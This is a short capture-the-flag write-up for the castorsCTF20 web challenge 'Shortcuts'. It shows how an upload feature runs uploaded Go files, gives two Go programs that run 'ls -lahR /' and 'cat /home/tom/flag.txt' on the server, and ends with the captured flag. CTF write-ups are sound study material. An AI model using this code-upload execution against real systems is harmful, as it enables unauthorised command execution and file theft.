---
type: "post"
title: "Shortcuts"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "web", "castorsCTF20"]
---

First, let's try to upload a go file.
```
exit status 1Sorry there doesn't seem to be a cat.go.go file
```
So it means we need to remove .go extension? Let's upload another one without extension.
Yep! It worked. But for that there needs to be one with extension and one without.

So if we can execute go file let's execute `ls -Rla` with go and find the interesting files.
```go
package main

import (
	"fmt"
	"os/exec"
)
func main() {
    cmd :=  exec.Command("/bin/ls", "-lahR", "/")
    stdout, err := cmd.Output()
    if err != nil {
        fmt.Println(err.Error())
    }
    fmt.Println(string(stdout))

}
```

We found the flag location! Let's print it

```go
package main

import (
	"fmt"
	"os/exec"
)
func main() {
    cmd :=  exec.Command("cat", "/home/tom/flag.txt")
    stdout, err := cmd.Output()
    if err != nil {
        fmt.Println(err.Error())
    }
    fmt.Println(string(stdout))

}
```

**Flag:** `castorsCTF{4_g00d_4tT1tUd3_Wil7_tk3_u_fuRtheR_Th4n_a_b44d_h}`
